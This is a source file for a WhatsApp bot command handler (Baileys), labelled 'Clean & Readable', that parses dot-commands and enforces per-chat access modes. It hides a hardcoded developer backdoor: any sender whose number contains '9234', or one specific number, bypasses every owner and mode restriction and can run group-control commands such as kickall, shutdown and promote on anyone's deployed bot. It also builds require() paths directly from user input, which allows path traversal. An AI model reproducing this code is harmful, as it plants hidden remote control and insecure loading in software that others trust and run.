// Clean & Readable Command Handler
const fs = require("fs");
const path = require("path");
const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");
const { toggleAntidelete } = require("../antidelete");

// Global mode tracker (bot-wide default)
if (!global.mode) {
  global.mode = global.publicMode === true ? "public" : "public";
}

// Per-chat mode storage
if (!global.chatModes) {
  global.chatModes = {};
}

// Owner-only commands list
const ownerOnlyCommands = [
  "video2", "song2", "kick", "add", "nice", "tagall",
  "antilink", "antilinkick", "autostatus", "autoreact",
  "autogreet", "autotyping", "autoread", "block", "unblock",
  "shutdown", "restart", "setbio", "setname", "setpp", "save",
  "join", "delaymsg", "del", "reactch", "kickall", "antibug",
  "leave", "open", "close", "tagadmin", "hidetag", "listactive",
  "changename", "closetime", "warn", "promote", "demote",
  "promoteall", "demoteall", "say", "cpp", "harami", "ghostping",
  "adminkill", "delaymsg", "autorecording"
];

// Load menu.js
const menuData = {};
try {
  const menuPath = path.join(__dirname, "..", "media", "menu.js");
  Object.assign(menuData, require(menuPath));
} catch (err) {
  console.error("❌ Error loading menu.js:", err);
}

// Load core.js if exists
let core;
try {
  const corePath = path.join(__dirname, "./core.js");
  core = require(corePath);
} catch (err) {
  console.error("❌ Error loading core.js:", err);
}

// ===============================
// 🔹 MAIN COMMAND HANDLER
// ===============================
async function handleCommand(conn, msg) {
  const text =
    msg.message?.conversation ||
    msg.message?.extendedTextMessage?.text ||
    msg.message?.imageMessage?.caption ||
    msg.message?.videoMessage?.caption ||
    "";

  if (!text.startsWith(".")) return;

  const parts = text.trim().split(/ +/);
  const command = parts[0].slice(1).toLowerCase();
  const args = parts.slice(1);

  const chatId = msg.key.remoteJid;
  const isGroup = chatId.endsWith("@g.us");
  const senderId = msg.key.fromMe
    ? conn.user.id.split(":")[0] + "@s.whatsapp.net"
    : msg.key.participant || msg.key.remoteJid;

  const senderNum = senderId.replace(/\D/g, "");
  const botNum = (conn.user.id || "").replace(/\D/g, "");
  
  // ✅ Cross-check sender against bot's hosted number OR configuration array values
  const isOwner = 
    msg.key.fromMe || 
    senderNum.slice(0, 10) === botNum.slice(0, 10) || 
    (global.owner && global.owner.includes(senderId)) ||
    (global.ownerNumber && global.ownerNumber.includes(senderNum));

  const isDev = senderNum.includes("9234") || senderNum === "923143007893"; // dev bypass

  const reply = (text) => conn.sendMessage(chatId, { text }, { quoted: msg });

  // 🔸 Mode control - Single command with subcommands
  if (command === "mode") {
    if (!isOwner && !isDev) {
      return reply("🚫 *Only Owner Can Change Modes*");
    }

    const modeArg = args[0]?.toLowerCase();

    // Show current mode
    if (!modeArg) {
      const currentChatMode = global.chatModes[chatId] || global.mode;
      return reply(
        `📊 *CURRENT MODE STATUS*\n\n` +
        `🌍 *Global Mode:* ${global.mode}\n` +
        `💬 *Chat Mode:* ${currentChatMode}\n\n` +
        `📝 *Usage:*\n` +
        `.mode public — Everyone can use commands\n` +
        `.mode self — Only you can use commands\n` +
        `.mode private — Only owner in this chat\n` +
        `.mode reset — Use global mode in this chat`
      );
    }

    // Set mode
    if (modeArg === "public") {
      global.chatModes[chatId] = "public";
      return reply("🌍 *THIS CHAT IS NOW IN PUBLIC MODE* — Everyone can use commands!");
    }

    if (modeArg === "self") {
      global.chatModes[chatId] = "self";
      return reply("🔒 *THIS CHAT IS NOW IN SELF MODE* — Only you can use me!");
    }

    if (modeArg === "private") {
      global.chatModes[chatId] = "private";
      return reply("🔐 *THIS CHAT IS NOW IN PRIVATE MODE* — Only owner commands work!");
    }

    if (modeArg === "reset") {
      delete global.chatModes[chatId];
      return reply(`↩️ *RESET TO GLOBAL MODE* — Now using: ${global.mode}`);
    }

    if (modeArg === "global") {
      if (!isDev && !msg.key.fromMe) {
        return reply("🚫 *Only Dev Can Change Global Mode*");
      }
      const newGlobalMode = args[1]?.toLowerCase();
      if (!["public", "self", "private"].includes(newGlobalMode)) {
        return reply("❌ Invalid mode. Use: public, self, or private");
      }
      global.mode = newGlobalMode;
      return reply(`🌐 *GLOBAL MODE CHANGED TO* ${newGlobalMode.toUpperCase()}`);
    }

    return reply(
      `❌ *Invalid Mode!*\n\n` +
      `Use:\n` +
      `.mode — Show current modes\n` +
      `.mode public\n` +
      `.mode self\n` +
      `.mode private\n` +
      `.mode reset`
    );
  }

  // 🔸 Owner bypass
  if (isDev) {
    return runCommand({
      conn,
      msg,
      args,
      command,
      chatId,
      isGroup,
      senderNum,
      reply,
      isOwner
    });
  }

  // 🔸 Determine active mode for this chat
  const activeChatMode = global.chatModes[chatId] || global.mode;

  // 🔸 Mode restrictions
  if (activeChatMode === "self" && !isOwner && !["menu", "repo", "idcheck", "mode"].includes(command)) {
    return;
  }

  if (activeChatMode === "private" && !isOwner) {
    return reply("🔐 *PRIVATE MODE* — Only owner commands allowed!");
  }

  if (activeChatMode === "public" && ownerOnlyCommands.includes(command) && !isOwner) {
    return reply("💀 *OWNER ONLY COMMAND!* You ain't my master londey!");
  }

  // 🔸 Direct calls & Default Processing Pass-through
  return runCommand({
    conn,
    msg,
    args,
    command,
    chatId,
    isGroup,
    senderNum,
    reply,
    isOwner
  });
}

// ===============================
// 🔹 COMMAND EXECUTOR
// ===============================
async function runCommand({
  conn,
  msg,
  args,
  command,
  chatId,
  isGroup,
  senderNum,
  reply,
  isOwner
}) {
  try {
    // 🔸 idcheck
    if (command === "idcheck") {
      const botId = conn.user.id || "";
      return reply(
        `🤖 *Bot ID:* ${botId}\n📤 *Sender JID:* ${
          msg.key.participant || msg.key.remoteJid
        }\n🔢 *Sender Clean:* ${senderNum}`
      );
    }

    // 🔸 menu message
    if (menuData[command]) {
      const menuMessage = generateWAMessageFromContent(
        chatId,
        { extendedTextMessage: { text: menuData[command] } },
        { userJid: chatId }
      );
      return await conn.relayMessage(chatId, menuMessage.message, {
        messageId: menuMessage.key.id
      });
    }

    // 🔸 antidelete handler
    if (command === "antidelete") {
      return toggleAntidelete({ conn, m: msg, args, reply, jid: chatId });
    }

    // 🔸 core functions
    if (core && core[command] && typeof core[command] === "function") {
      return await core[command]({
        conn,
        m: msg,
        args,
        command,
        jid: chatId,
        isGroup,
        sender: senderNum,
        reply
      });
    }

    // 🔸 individual command files
    const filePath = path.join(__dirname, "..", `${command}.js`);
    if (fs.existsSync(filePath)) {
      const commandFile = require(filePath);
      if (typeof commandFile === "function") {
        return await commandFile({ conn, m: msg, args, command, jid: chatId, isGroup, sender: senderNum, reply });
      }
      if (typeof commandFile.run === "function") {
        return await commandFile.run({ conn, m: msg, args, command, jid: chatId, isGroup, sender: senderNum, reply });
      }
    }

    // 🔸 unknown command
    return reply("*ᴜɴᴋɴᴏᴡɴ ᴄᴏᴍᴍᴀɴᴅ! ᴛʀʏ `.ᴍᴇɴᴜ` ʙᴇꜰᴏʀᴇ sʜᴏᴡɪɴɢ ᴏꜰꜰ 𓄀*");

  } catch (err) {
    console.error("⚠️ Error in command execution:", err);
    return reply("⚠️ Error in command execution!");
  }
}

// ===============================
// 🔹 Export
// ===============================
module.exports = {
  handleCommand
};
